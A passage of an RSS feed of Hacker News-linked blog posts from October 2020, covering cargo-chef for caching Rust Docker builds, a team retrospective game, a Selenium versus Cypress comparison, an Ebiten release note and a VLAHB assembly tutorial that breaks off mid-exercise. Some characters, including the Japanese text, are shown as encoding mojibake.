<a href="https://www.amazon.co.uk/Accelerate-Software-Performing-Technology-Organizations/dp/1942788339">Accelerate</a> has taught you to optimise for small changes deployed multiple times a day. But if each build takes ages it is very unlikely that your engineers will be willing to go through the ordeal often.<br>
They will start batching up changes, making it much more likely than one of those deployments will result in an outage. </p>
<p>Slow Docker builds will bite you again during those outages: the speed of your CI pipeline puts a hard limit on how fast you can roll out an emergency patch to mitigate an incident ("fix forward").<br>
If it takes 20 minutes to build a Docker container then the incident will be <em>at least</em> 20 minutes long (assuming you find the right fix as soon as the incident happens - unlikely).</p>
<p>In other words - do not neglect your CI/CD pipeline. It impacts your bottom line.</p>
<blockquote>
<p>Ok, ok, you convinced me! I want fast Docker builds! How?</p>
</blockquote>

<p>Let's have a look at your typical Rust Dockerfile:</p>
<pre><code><span>FROM</span><span> rust </span><span>as </span><span>builder
</span><span>WORKDIR </span><span>app
</span><span>COPY</span><span> . .
</span><span># This works with the dummy project generated by `cargo new app --bin`
</span><span>RUN </span><span>cargo build --release --bin app

</span><span>FROM</span><span> rust </span><span>as </span><span>runtime
</span><span>WORKDIR </span><span>app
</span><span>COPY</span><span> --from=</span><span>builder</span><span> /app/target/release/app /usr/local/bin
ENTRYPOINT ["</span><span>./usr/local/bin/app</span><span>"]
</span></code></pre>
<p>It is a <a href="https://docs.docker.com/develop/develop-images/multistage-build/"><em>multi-stage</em> build</a>: we create an intermediate Docker image (<code>builder</code>) to compile our binary and then we copy that binary over to the final Docker image (<code>runtime</code>) where we actually run it.<br>
The <code>builder</code> stage often requires more dependencies (e.g. OS packages) than the runtime stage, which can be kept fairly slim leading to smaller images with minimal attack surface.</p>
<p>If you run <code>docker build -t dummy-image .</code> you will see something like this in your terminal:</p>
<pre><code><span>Sending build context to Docker daemon  41.47kB
Step 1/8 : FROM rust as builder
 ---&gt; f5fde092a1cd
Step 2/8 : WORKDIR app
 ---&gt; Using cache
 ---&gt; 53c89dd8e048
Step 3/8 : COPY . .
 ---&gt; 39bc69ee400b
Step 4/8 : RUN cargo build --release --bin app
 ---&gt; Running in 9dc66ef72185
   Compiling app v0.1.0 (/app)
    Finished release [optimized] target(s) in 0.73s
Removing intermediate container 9dc66ef72185
 ---&gt; 13b22cf28e60
Step 5/8 : FROM rust as runtime
 ---&gt; f5fde092a1cd
Step 6/8 : WORKDIR app
 ---&gt; Using cache
 ---&gt; 53c89dd8e048
Step 7/8 : COPY --from=builder /app/target/release/app /usr/local/bin
 ---&gt; f1e7055edd75
Step 8/8 : ENTRYPOINT ["./usr/local/bin/app"]
 ---&gt; Running in dc4a9dcc7cd5
Removing intermediate container dc4a9dcc7cd5
 ---&gt; e127c4129b2f
Successfully built e127c4129b2f
Successfully tagged dummy-image:latest
</span></code></pre>
<p>Each <code>RUN</code>, <code>COPY</code> and <code>ADD</code> instruction creates <a href="https://dzone.com/articles/docker-layers-explained">a <em>layer</em></a>: a diff between the previous state (the layer above) and the current state after having executed the specified command.<br>
Layers are cached.<br>
If the starting point of an operation has not changed (e.g. the base image) and the command itself has not changed (e.g. the checksum of the files copied by <code>COPY</code>) Docker does not perform any computation and directly retrieves a copy of the result from the local cache.</p>
<p>We can see it in action by running again <code>docker build -t dummy-image .</code>:</p>
<pre><code><span>Sending build context to Docker daemon  41.47kB
Step 1/8 : FROM rust as builder
 ---&gt; f5fde092a1cd
Step 2/8 : WORKDIR app
 ---&gt; Using cache
 ---&gt; 53c89dd8e048
Step 3/8 : COPY . .
 ---&gt; Using cache
 ---&gt; 39bc69ee400b
Step 4/8 : RUN cargo build --release --bin app
 ---&gt; Using cache
 ---&gt; 13b22cf28e60
Step 5/8 : FROM rust as runtime
 ---&gt; f5fde092a1cd
Step 6/8 : WORKDIR app
 ---&gt; Using cache
 ---&gt; 53c89dd8e048
Step 7/8 : COPY --from=builder /app/target/release/app /usr/local/bin
 ---&gt; Using cache
 ---&gt; f1e7055edd75
Step 8/8 : ENTRYPOINT ["./usr/local/bin/app"]
 ---&gt; Using cache
 ---&gt; e127c4129b2f
Successfully built e127c4129b2f
Successfully tagged dummy-image:latest
</span></code></pre>
<p>Notice the <code>Using cache</code> log after every single step. No output at all from <code>cargo build</code> - execution has been skipped entirely. </p>
<p>Docker layer caching is <em>fast</em> and can be leveraged to massively speed up Docker builds.<br>
The trick is optimising the order of operations in your Dockerfile: anything that refers files that are changing often (e.g. your source code) should appear as late as possible, therefore maximising the likelihood of the previous step being unchanged and allowing Docker to retrieve the result straight from the cache.</p>
<p>The expensive step is usually compilation.<br>
Most programming languages follow the same playbook: you <code>COPY</code> a lock-file of some kind first, build your dependencies, <code>COPY</code> over the rest of your source code and then build your project.<br>
This guarantees that most of the work is cached as long as your dependency tree does not change between one build and the next.</p>
<p>In a Python project, for example, you might have something along these lines:</p>
<pre><code><span>FROM</span><span> python:3
</span><span>COPY</span><span> requirements.txt
</span><span>RUN </span><span>pip install -r requirements.txt
</span><span>COPY</span><span> src/ /app
</span><span>WORKDIR </span><span>/app
CMD ["</span><span>python</span><span>", "</span><span>app</span><span>"]
</span></code></pre>
<p>What about Rust?</p>

<p><code>cargo</code>, as of today, does not provide a mechanism to build your project dependencies starting from its <code>Cargo.lock</code> file (e.g. <code>cargo build --only-deps</code>).<br>
Therefore Rust projects have always struggled to leverage Docker layer caching properly.</p>
<p>If you search for "Rust Docker cache" on Google you will bump into a variety of articles that propose a variety of workarounds.<br>
The <a href="https://stackoverflow.com/questions/58473606/cache-rust-dependencies-with-docker-build">blessed answer on StackOverflow</a>, as many other blog posts, suggests the following steps to unlock Docker layer caching for a simple project: copy the lock file, create a dummy <code>main.rs</code> file, build the project, delete the dummy file, copy over your source code, build again.</p>
<pre><code><span>FROM</span><span> rust
</span><span>WORKDIR </span><span>/var/www/app
</span><span>COPY</span><span> dummy.rs .
</span><span>COPY</span><span> Cargo.toml .
</span><span>RUN </span><span>sed -i '</span><span>s#src/main.rs#dummy.rs#</span><span>' Cargo.toml
</span><span>RUN </span><span>cargo build --release
</span><span>RUN </span><span>sed -i '</span><span>s#dummy.rs#src/main.rs#</span><span>' Cargo.toml
</span><span>COPY</span><span> . .
</span><span>RUN </span><span>cargo build --release
CMD ["</span><span>target/release/app</span><span>"]
</span></code></pre>
<p>It is a bit cumbersome but you can live with it for a simple single-binary project. You just need to keep your Dockerfile up to date every time you restructure your file structure (and book some time to explain to your colleagues what the hell you are doing).</p>
<p>As soon as your project grows in complexity (e.g. a workspace with a few crates) this "workaround" leads to an entangled mess that is painful to watch (and maintain).</p>
<p>I am currently finalising the chapter of <a href="https://zero2prod.com/">Zero To Production In Rust</a> on deployment best-practices for Rust projects - I have no intention of teaching this workaround as the best-way to get fast Docker builds with Rust.<br>
I set out to build something nicer and less error-prone.</p>

<p><a href="https://github.com/LukeMathWalker/cargo-chef"><code>cargo-chef</code></a> is a new <code>cargo</code> sub-command.<br>
You can install from <a href="https://crates.io/">crates.io</a> with</p>
<pre><code><span>cargo</span><span> install cargo-chef
</span></code></pre>
<p><code>cargo-chef</code> exposes two commands: <code>prepare</code> and <code>cook</code>:</p>
<pre><code><span>cargo</span><span> chef</span><span> --help
</span></code></pre><pre><code><span>
cargo-chef

USAGE:
    cargo chef &lt;SUBCOMMAND&gt;

SUBCOMMANDS:
    cook       Re-hydrate the minimum project skeleton identified by `cargo chef prepare` and
               build it to cache dependencies
    prepare    Analyze the current project to determine the minimum subset of files (Cargo.lock
               and Cargo.toml manifests) required to build it and cache dependencies
</span></code></pre>
<p><code>prepare</code> examines your project and builds a <em>recipe</em> that captures the set of information required to build your dependencies.</p>
<pre><code><span>cargo</span><span> chef prepare</span><span> --recipe-path</span><span> recipe.json
</span></code></pre>
<p>Nothing too mysterious going on here, you can examine the <code>recipe.json</code> file: it contains the skeleton of your project (e.g. all the <code>Cargo.toml</code> files with their relative path, the <code>Cargo.lock</code> file if available) plus a few additional pieces of information.<br>
In particular it makes sure that all libraries and binaries are explicitly declared in their respective <code>Cargo.toml</code> files even if they can be found at the canonical default location (<code>src/main.rs</code> for a binary, <code>src/lib.rs</code> for a library).</p>
<p>The <code>recipe.json</code> is the equivalent of the Python <code>requirements.txt</code> file - it is the only input required for <code>cargo chef cook</code>, the command that will build out our dependencies:</p>
<pre><code><span>cargo</span><span> chef cook</span><span> --recipe-path</span><span> recipe.json
</span></code></pre>
<p>If you want to build in <code>--release</code> mode:</p>
<pre><code><span>cargo</span><span> ‚Ä¶</span></code></pre></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.lpalmieri.com/posts/fast-rust-docker-builds/">https://www.lpalmieri.com/posts/fast-rust-docker-builds/</a></em></p>]]>
            </description>
            <link>https://www.lpalmieri.com/posts/fast-rust-docker-builds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942601</guid>
            <pubDate>Fri, 30 Oct 2020 14:32:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The ‚ÄúI Suck‚Äù Awards]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942461">thread link</a>) | @mcrittenden
<br/>
October 30, 2020 | https://critter.blog/2020/10/30/the-i-suck-awards/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/10/30/the-i-suck-awards/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-2627">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>One of my favorite team retrospective activities is what I call the ‚ÄúI Suck‚Äù awards. </p>



<p>It‚Äôs simple. Here‚Äôs the process:</p>



<ul><li>Step 1: Someone kicks it off by saying why they suck at that moment</li><li>Step 2: The rest of the team laughs or empathizes or whatever the situation calls for</li><li>Step 3: Repeat steps 1 and 2 until everyone has said why they suck</li><li>Step 4: Vote on the winner of the ‚ÄúI Suck‚Äù award, aka the person with the most impressive suckitude that time around. </li></ul>



<p>Everyone sucks for some reason at any given time. Maybe they procrastinated. Maybe they missed an obvious bug. Maybe they keep forgetting to update the sprint board. Maybe they have been talking too much on calls. Maybe they didn‚Äôt submit their dang timesheet. Whatever it is, everyone has one.</p>



<p>There are a few reasons why I love this activity:</p>



<ul><li>It‚Äôs fun and often hilarious</li><li>It discourages <a href="https://en.wikipedia.org/wiki/Cover_your_ass">Cover Your Ass (CYA)</a> Engineering</li><li>It gives people a chance to drop some tips for next time</li><li>It‚Äôs great for <a href="https://critter.blog/2016/10/27/the-whys-and-hows-of-jelling-teams/">team jelling</a> </li><li>It lets us learn from each other‚Äôs mistakes</li><li>It reduces the sense of <a href="https://critter.blog/2020/10/26/you-cant-fail-at-experiments/">shame that accompanies messing up</a></li></ul>



<p>I stole the idea from Radical Candor, which calls it the ‚Äú<a href="https://www.radicalcandor.com/encourage-feedback/#:~:text=Introduce%20Whoops-a-Daisy">Whoops-A-Daisy</a>‚Äú. </p>



<p>It‚Äôs powerful and it‚Äôs fun, so give it a shot! Why do you suck?</p>





		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/10/30/the-i-suck-awards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942461</guid>
            <pubDate>Fri, 30 Oct 2020 14:20:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Automated End-to-End Testing with Selenium and Cypress.io]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942411">thread link</a>) | @thinkcru
<br/>
October 30, 2020 | https://thinkcru.com/blog/end-to-end-testing-with-selenium-and-cypress-io/ | <a href="https://web.archive.org/web/*/https://thinkcru.com/blog/end-to-end-testing-with-selenium-and-cypress-io/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
              <p>At <a href="https://thinkcru.com/">ThinkCru </a>building stable applications that are well tested is our #1 priority. &nbsp;At first pass, we do Quality Assurance (QA) testing manually to ensure we are initially meeting our client's requirements. &nbsp;However, at some point, as the application grows in complexity, manual testing is no longer sustainable. &nbsp;In order to scale up testing as new features are added we deploy <em>automated </em>end-to-end (e2e) testing for using both Selenium and Cypress frameworks. &nbsp;</p><h2 id="key-differences">Key Differences</h2><p>The purpose of this post is to explore some of the key differences between the Selenium and Cypress frameworks. &nbsp;Bellow is just a brief comparison</p><!--kg-card-begin: html--><div>
<table>
  <tbody><tr>
    <th scope="col">Framework</th>
    <th scope="col">Selenium WebDriver</th>
    <th scope="col">Cypress.io</th>
  </tr>
  <tr>
    <td>Supported Languages</td>
    <td>Java, C#, Java Script, Python, Ruby, Onjective-C</td>
    <td>Java Script</td>
  </tr>
  <tr>
    <td>Framework supported</td>
    <td>Supports multiple frameworks based on specific programming languages. (For e.g: JUnit for Java, Cucumber for JavaScript, etc.) </td>
    <td>Supports only Mocha JS</td>
  </tr>
  <tr>
    <td>Browsers Supported</td>
    <td>Chrome, IE, Safari Edge, Firefox, Opera</td>
    <td>Chrome, Edge, Firefox Electron</td>
  </tr>    
  <tr>
    <td>Issues in GitHub</td>
    <td>Open - 287, Closed - 6513</td>
    <td>Open - 1295, Closed - 5196</td>
  </tr>
<tr>
    <td>iFrame Support</td>
    <td>Yes</td>
    <td>No</td>
  </tr>
</tbody></table>
</div>
<!--kg-card-end: html--><hr><h2 id="selenium">Selenium</h2><h3 id="how-selenium-works">How Selenium works?</h3><p>Selenium is driven by a variety of languages (Java, C#, Java Script, Python, Ruby, Objective-C) using an API that communicates with the <code>WebDriver</code> binary.</p><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/Selenium-WebDriver-for-Automation-Testing-1-.jpg" alt=""><figcaption>Curtesy of Browserstack.com</figcaption></figure><ol><li>Using the API, the Selenium commands creates an HTTP Request for each Selenium command and sends it to the browser driver.</li><li>An HTTP request is then sent to the server using a specific Browser Driver (Chrome Driver, Firefox Driver, IE Driver, MS Edge Driver, etc).</li><li>Then the steps are executed on the HTTP server.</li><li>The execution status is sent to the HTTP server which is then captured by the Selenium script.</li></ol><h3 id="advantages-of-selenium">Advantages of Selenium</h3><ol><li>Robust community, multiple bindings, and allows engineers to use best practices</li><li>Mobile testing support</li><li>Compared to Cypress, Selenium can work with iFrame elements and browser tabs</li></ol><h3 id="limitations-of-selenium">Limitations of Selenium</h3><ol><li>No built-in command for automatic generation of test results.</li><li>Handling page load or element load is difficult.</li><li>Creating test cases is time-consuming as compared to Cypress</li><li>Difficult to set up test environment as compared to Cypress</li></ol><h3 id="multiple-tabs">Multiple Tabs</h3><p>To work with browser you should get an array of your tabs and select one:</p><pre><code>WebDriver driver = new ChromeDriver();

ArrayList&lt;String&gt; tabs = new ArrayList&lt;String&gt;
(driver.getWindowHandles());
driver.switchTo().window(tabs.get(1));</code></pre><h3 id="iframes">iFrames</h3><p>Selenium purpose 3 methods to enter into iFrame:</p><pre><code>driver.switchTo().frame(0);
driver.switchTo().frame("frameName");
driver.switchTo().frame(webElement);</code></pre><p>Now you are able to work with html elements into selected iFrame. Also you can enter into new iFrame if it's located into entered iFrame.</p><p>But there is only one way to get out from iFrame:</p><pre><code>driver.switchTo().defaultContent();</code></pre><hr><h2 id="cypress">Cypress</h2><h3 id="how-cypress-works">How Cypress works?</h3><p>Cypress developers created a new architecture from the ground up. Whereas Selenium executes remote commands through the network, Cypress runs in the same run-loop as your application. Behind Cypress is a Node.js server process. Cypress and the Node.js process constantly communicate, synchronize, and perform tasks on behalf of each other. Having access to both parts (front and back) gives us the ability to respond to your application's events in real time, while at the same time work outside of the browser for tasks that require a higher privilege.</p><h3 id="advantages-of-cypress">Advantages of Cypress</h3><ol><li>Easy to setup and start</li><li>Good documentation and code samples</li><li>Cypress captures snapshots at the time of test execution. This allows QAs or developers to hover over a specific command in the Command Log to see exactly what happened at that particular step. See more <a href="https://docs.cypress.io/guides/core-concepts/test-runner.html">https://docs.cypress.io/guides/core-concepts/test-runner.html</a></li><li>One doesn‚Äôt need to add explicit or implicit wait commands in test scripts, unlike Selenium. Cypress waits automatically for commands and assertions.</li><li>As the programmer writes commands, Cypress executes them in real-time, providing visual feedback as they run.</li></ol><h3 id="limitations-of-cypress">Limitations of Cypress</h3><ol><li>One cannot use Cypress to drive two browsers at the same time</li><li>It doesn‚Äôt provide support for multi-tabs</li><li>Cypress doesn‚Äôt provide support for browsers like Safari and IE at the moment</li><li>Limited support for iFrames. See <a href="https://www.cypress.io/blog/2020/02/12/working-with-iframes-in-cypress/">https://www.cypress.io/blog/2020/02/12/working-with-iframes-in-cypress/</a></li></ol><h2 id="coding">Coding</h2><h3 id="example-test-case-">Example Test Case:</h3><ol><li>Clone the example repo <code><a>git clone git@github.com</a>:thinkcru/selenium-test-project.git</code></li><li>Open <a href="https://www.xe.com/">https://www.xe.com/</a></li><li>Enter '100' in the Amount field</li><li>Click the 'Convert' button</li><li>Check that convert result more than '84'</li></ol><h3 id="selenium-java-project">Selenium (Java) Project</h3><ol><li>Download and install JDK (<a href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a>)</li><li>Download and install IDE (f.e. IntelliJ IDEA <a href="https://www.jetbrains.com/idea/download">https://www.jetbrains.com/idea/download</a>)</li><li>Open IDE and create a project</li></ol><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_19h21_55.png" alt=""></figure><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_19h22_14.png" alt=""></figure><p>4. &nbsp; By default <code>pom.xml</code> file doesn't contain any dependencies. For our example we will need some dependencies (Selenium, WebDriverManager, TestNG). See more maven dependencies on <a href="https://mvnrepository.com/">https://mvnrepository.com/</a></p><!--kg-card-begin: html--><!--kg-card-end: html--><p>5. &nbsp; Create a package and java class</p><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_19h51_01.png" alt=""></figure><p>6. &nbsp; For now you need to initialize WebDriver. There are two ways to do it: manually download WebDriver for a browser or use WebDriverManager (<a href="https://github.com/bonigarcia/webdrivermanager">https://github.com/bonigarcia/webdrivermanager</a>). To use WebDriverManager you need to add a dependency to pom.xml file.</p><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_19h52_02.png" alt=""><figcaption>WebDriver initialization without WebDriverMaganer</figcaption></figure><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_19h53_10.png" alt=""><figcaption>WebDriver initialization with WebDriverMaganer</figcaption></figure><p>7. &nbsp; The following code example is how to implement the <code>chromeDriver()</code> to send an input with the amount of <code>100</code> into the text field. &nbsp;The driver will then <code>click()</code> on the button associated with form submission. &nbsp;An assertion <code>assertTrue()</code> will wait for the text to resolve the amount to <code>84.0</code>.</p><!--kg-card-begin: html--><!--kg-card-end: html--><hr><h3 id="cypress-project">Cypress project</h3><ol><li>Clone the example project from the repo <code>git clone <a>git@github.com</a>:thinkcru/cypress-io-test-project.git</code></li><li>Download Node.js (<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a>)</li><li>Download IDE: WebStorm or Visual Studio Code. I will user VSC in this example.</li><li>Create a folder for Cypress project</li><li>Open the folder in cmd and run the following command to install Cypress</li></ol><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_20h45_26.png" alt=""></figure><p>5. &nbsp; Add <code>package.json</code> file to open Cypress. Now we can open Cypress by clicking <code>cypress:open</code></p><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_20h51_47.png" alt=""></figure><p>6. &nbsp; Click <code>cypress:open</code> to open Cypress. After the first launch test examples will be generated</p><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_21h00_44.png" alt=""></figure><p>7. &nbsp; &nbsp;Create a folder in <code>cypress/integration/</code> and <code>spec.js</code> file</p><p>8. &nbsp; &nbsp;Create the example code and is quick and easy to implement the tests much like how a Unit Test is written. &nbsp;In about 4 lines of code we can use the <code>cy</code> library to add the amount and invoke an expectation from what is returned in the browser.</p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="conclusion">Conclusion</h2><p>Cypress and Selenium serve a similar purpose that is achieved in two different ways. A key difference is that Cypress ideal for introducing developers to test automation rather than just a replacement for Selenium. This is why Cypress is among the fastest-growing automation tools in the world. On the other hand, Selenium is a more general-purpose tool targeted at a broader audience.</p><p>Needless to say, prior to choosing an automation tool, one must weigh the pros and cons of every option. &nbsp; If you are a beginner and are comfortable with Javascript then Cypress may be a good option. &nbsp;On the other hand, if you have more complex needs, Selenium may be worth to try at first if loading up the driver is not too much effort.</p><p>Another thing to keep in mind is that if you look at how Cypress is built, it is largely a unit testing tool that is ideal for Javascript-focused development teams. Once you stray from these details and your team decides to experiment with other methods of test automation, you‚Äôll find that Selenium can better accommodate those growing pains.</p>
            </div>
          </div></div>]]>
            </description>
            <link>https://thinkcru.com/blog/end-to-end-testing-with-selenium-and-cypress-io/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942411</guid>
            <pubDate>Fri, 30 Oct 2020 14:16:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Golang game engine v2 released]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24942250">thread link</a>) | @nargella
<br/>
October 30, 2020 | https://ebiten.org/blog/v2.0.0.html | <a href="https://web.archive.org/web/*/https://ebiten.org/blog/v2.0.0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p lang="en">We are very happy to announce the release of v2.0.0 (<a href="https://ebiten.org/documents/2.0.html">Release Note</a>).</p>
    <p lang="ja">v2.0.0 „Åå„É™„É™„Éº„Çπ„Åï„Çå„Åæ„Åó„Åü! Ë©≥„Åó„Åè„ÅØ<a href="https://ebiten.org/documents/2.0.html">„É™„É™„Éº„Çπ„Éé„Éº„Éà</a>„ÇíÂèÇÁÖß„Åó„Å¶„Åè„Å†„Åï„ÅÑ„ÄÇ</p>
    <p lang="en">I appreciate all the contributors and <a href="https://github.com/sponsors/hajimehoshi">all the sponsors</a>. Thank you very much!</p>
    <p lang="ja">„Åô„Åπ„Å¶„ÅÆ„Ç≥„É≥„Éà„É™„Éì„É•„Éº„Çø„Éº„Å®<a href="https://github.com/sponsors/hajimehoshi">„Çπ„Éù„É≥„Çµ„Éº„ÅÆÁöÜÊßò</a>„Å´ÊÑüË¨ù„ÅÑ„Åü„Åó„Åæ„Åô„ÄÇ„Å©„ÅÜ„ÇÇ„ÅÇ„Çä„Åå„Å®„ÅÜ„Åî„Åñ„ÅÑ„Åæ„Åô!</p>
    <p lang="en">v2.0 doesn't have any new features. The features are same as v1.12. As there are breaking changes in the API, please refer <a href="https://ebiten.org/documents/to_v2.html">Ebiten 2.0 migration guide</a> for the details.</p>
    <p lang="ja">v2.0 „Å´„ÅØÊñ∞Ê©üËÉΩ„Åå‰∏ÄÂàá„ÅÇ„Çä„Åæ„Åõ„Çì„ÄÇÊ©üËÉΩÁöÑ„Å´„ÅØ v1.12 „Å®ÂêåÁ≠â„Åß„Åô„ÄÇ API „ÅÆÁ†¥Â£äÁöÑÂ§âÊõ¥„Åå„ÅÇ„Çä„Åæ„Åô„ÅÆ„Åß„ÄÅË©≥„Åó„Åè„ÅØ„Äå<a href="https://ebiten.org/documents/to_v2.html">Ebiten 2.0 ÁßªË°å„Ç¨„Ç§„Éâ</a>„Äç„ÇíÂèÇÁÖß„Åó„Å¶„Åè„Å†„Åï„ÅÑ„ÄÇ</p>
    <p lang="en">The master branch has already been v2.1. Only bug fixes will be merged to v2.0 and v1.12. We plan to release v2.1.0 in March 2021. After releasing v2.1.0, v1.12 will no longer be maintained.</p>
    <p lang="ja">master „Éñ„É©„É≥„ÉÅ„ÅØ„Åô„Åß„Å´ v2.1 „Å®„Å™„Å£„Å¶„ÅÑ„Åæ„Åô„ÄÇ v2.0 „Å® v1.12 „ÅØ‰ªäÂæå„Éê„Ç∞‰øÆÊ≠£„ÅÆ„Åø„ÅåÂÖ•„Çä„Åæ„Åô„ÄÇ v2.1.0 „ÅÆ„É™„É™„Éº„Çπ„ÅØ 2021 Âπ¥ 3 ÊúàÈ†É„ÅÆ‰∫àÂÆö„Åß„Åô„ÄÇ v2.1.0 „ÅÆ„É™„É™„Éº„ÇπÂæå„ÄÅ v1.12 „ÅØ„É°„É≥„ÉÜ„Åï„Çå„Å™„Åè„Å™„Çã‰∫àÂÆö„Åß„Åô„ÄÇ</p>
    <p lang="en">Enjoy!</p>
  </div></div>]]>
            </description>
            <link>https://ebiten.org/blog/v2.0.0.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942250</guid>
            <pubDate>Fri, 30 Oct 2020 14:01:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Make your own PONG in Assembly]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942137">thread link</a>) | @akully
<br/>
October 30, 2020 | http://adamkulidjian.com/vlahb.html | <a href="https://web.archive.org/web/*/http://adamkulidjian.com/vlahb.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    

    <p>Nov 13, 2019 - <a href="https://github.com/Kully/VLAHB">Github Link</a></p>

    <div>
        <p><img src="http://adamkulidjian.com/imgs/conway2.gif">
        </p>
        <p><img src="http://adamkulidjian.com/imgs/pong2.gif">
        </p>
    </div>

    <br>

    <h2>Scope of Blog</h2>

    <p>To provide a very simple overview of the assembly programming language in <a href="https://github.com/Kully/VLAHB">VLAHB</a> and assembly programming principles in general. Machine code and opcodes is beyond the scope of this blog post.</p>

    <h2>The Brains of the Operation</h2>

    <p>A <b>virtual machine</b> ("vm") acts like a real computer but it only exists within software and not hardware. This means that a virtual machine is not made of physical pieces of etched silicon, printed circuit boards, transistors or capacitors or anything like that. Instead it is "virtual" which means that we program this computer ourselves to do what want: to read and execute binary files according to a blueprint we give it.</p>

    <p>Checkout the file called <a href="https://github.com/Kully/VLAHB/blob/master/vm.c#L142-L571">vm.c</a> in <b>VLAHB</b>. See the <b>switch</b> statement and all the <b>case</b> lines? This is code that tells the virtual machine that if it sees an instruction <b>0x0001</b>, do <b>X</b>. If it sees <b>0x0002</b>, do <b>Y</b>, and so on and so forth.</p>


    <h2>Assembly to Binary</h2>

    <p><b>VLAHB</b> is a vm together with an assembly language - let's call it <b>VASM</b> - and an assembler (<i>assembler.py</i>) which converts assembly files (<i>file.asm</i>) to raw machine code (<i>file.bin</i>) that our vm can read and execute.</p>

    <p><img src="http://adamkulidjian.com/imgs/asm_hex_bin_thinarrow.png"></p><p>The process of turning file.asm to file.bin is called <b>assembling</b>.</p>

    <p>Our vm features a special integer called a <b>program counter</b> ("pc") which keeps track of what line the vm is reading at a time. When you tell the vm to run the program <i>myFile.bin</i>, the <b>pc</b> value is assigned to the line number of the program that the vm will begin "reading" (think Turing Machine). The pc is set to this value and then...</p>

    <ul>
        <li>vm reads instruction</li>
        <li>vm executes instruction</li>
        <li><i>pc increments</i></li>
        <li>vm reads instruction</li>
        <li>vm executes instruction</li>
        <li><i>pc increments</i></li>
        ... and so on
    </ul>
    <p>Nothing is inherently special about these cryptic codes. <b>1002 0003 0000 fde8</b> has no inherent meaning but the vm reads and knows to load the literal 65000 into ram at index 4098.</p>

    <h2>RAM</h2>

    <p>There is a list called <b>ram</b> stored in our virtual machine <a href="https://github.com/Kully/VLAHB/blob/master/vm.c">vm.c</a>. It contains 65535 0's. Each slot of ram holds an integer from 0 to 4294967295. By changing the values in our ram slots we can get super mario to run across the screen, create a paint application, or solve world peace.</p>

    <pre><code>// Empty brackets <b>[ ]</b> represent <b>0</b>
ram := [ ][ ][ ][ ][ ][ ][ ][ ]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 </code></pre>

    

    <p><b>Ram Slot Dedication:</b> this represents how our ram slot are organized

    </p><pre><code>[-----------] [-------] [--] [---------] [---------------------------]
0       4095  4096 4099 4100 4101  27140 27141                   65535 
</code></pre>

    <table>
        <tbody><tr>
            <th>slots in ram</th>
            <th>what they do</th>
        </tr>
        <tr>
            <td>0-4095</td>
            <td>function inputs</td>
        </tr>
        <tr>
            <td>4096-4099</td>
            <td>4 pointers (U,V,Y,Z resp.)</td>
        </tr>
        <tr>
            <td>4100</td>
            <td>return slot for function outputs</td>
        </tr>
        <tr>
            <td>4101-27140</td>
            <td>vram</td>
        </tr>
        <tr>
            <td>27141-65535</td>
            <td>free space</td>
        </tr>
    </tbody></table>

    <h2>Simple Operations</h2>

    <p>The simplest operation to perform on ram is a direct load. This loads a value into a slot of ram.</p>

    <p>
    <b> Ex. 1 </b></p><pre><code>LD R[3] 2  // load 2 into the slot of ram at index 3
</code></pre>

    <pre><code>
ram := [ ][ ][ ][2][ ][ ][ ][ ]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 
    </code></pre>

    <p>There are other ways to manipulate ram. <b>VASM</b> handles all the basic operations <b>+</b>, <b>-</b>, <b>√ó</b>, <b>√∑</b></p>

    <p>
    <b>Ex. 2</b></p><pre><code>ADD R[1] 8     // ram[1] = ram[1] + 8
SUB R[2] R[1]  // ram[2] = ram[2]-ram[1]
MUL R[2] 5     // ram[2] = ram[2] * 5</code></pre>

    <hr>

    <p><b>Exercise 1</b> What happens to ram after compiling this assembly code and running it in vm?
    <br><i>(assume <b>ram</b> is initialized as an array of 0s)</i></p><pre><code>LD R[2] 2
MUL R[2] 2
LD R[69] 3
MUL R[2] R[3]
